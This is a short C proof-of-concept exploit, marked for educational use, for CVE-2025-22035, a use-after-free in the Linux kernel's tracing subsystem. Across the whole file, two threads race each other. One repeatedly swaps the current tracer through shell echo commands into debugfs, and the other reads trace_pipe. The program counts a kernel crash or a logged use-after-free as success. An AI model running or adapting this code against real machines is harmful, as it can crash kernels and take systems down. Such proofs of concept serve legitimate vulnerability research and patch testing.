// SPDX-License-Identifier: GPL-2.0
// **EDUCATIONAL USE ONLY** - CVE-2025-22035 PoC
// Compile: gcc -o cve-2025-22035 cve-2025-22035.c -lpthread

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define TRACE_PATH "/sys/kernel/debug/tracing/"
#define MAX_RACE_ATTEMPTS 100000

// Global variables for race condition
volatile int stop_race = 0;
int trace_fd;

// Thread 1: Continuously switch tracers to trigger UAF
void *tracer_switcher(void *arg) {
    while (!stop_race) {
        system("echo function_graph > " TRACE_PATH "current_tracer");
        system("echo timerlat > " TRACE_PATH "current_tracer");
    }
    return NULL;
}

// Thread 2: Read from trace_pipe to trigger UAF access
void *trace_reader(void *arg) {
    char buf[1024];
    while (!stop_race) {
        if (read(trace_fd, buf, sizeof(buf)) < 0) {
            perror("read() failed");
            break;
        }
    }
    return NULL;
}

int main() {
    pthread_t switcher_thread, reader_thread;

    // Open trace_pipe to trigger UAF
    trace_fd = open(TRACE_PATH "trace_pipe", O_RDONLY | O_NONBLOCK);
    if (trace_fd < 0) {
        perror("open() trace_pipe failed");
        return 1;
    }

    printf("[+] Starting race condition...\n");

    // Create threads to trigger UAF
    pthread_create(&switcher_thread, NULL, tracer_switcher, NULL);
    pthread_create(&reader_thread, NULL, trace_reader, NULL);

    // Let the race run for a while
    sleep(5);

    // Stop threads
    stop_race = 1;
    pthread_join(switcher_thread, NULL);
    pthread_join(reader_thread, NULL);
    close(trace_fd);

    printf("[!] If kernel crashes or logs UAF, exploit was successful.\n");
    return 0;
}
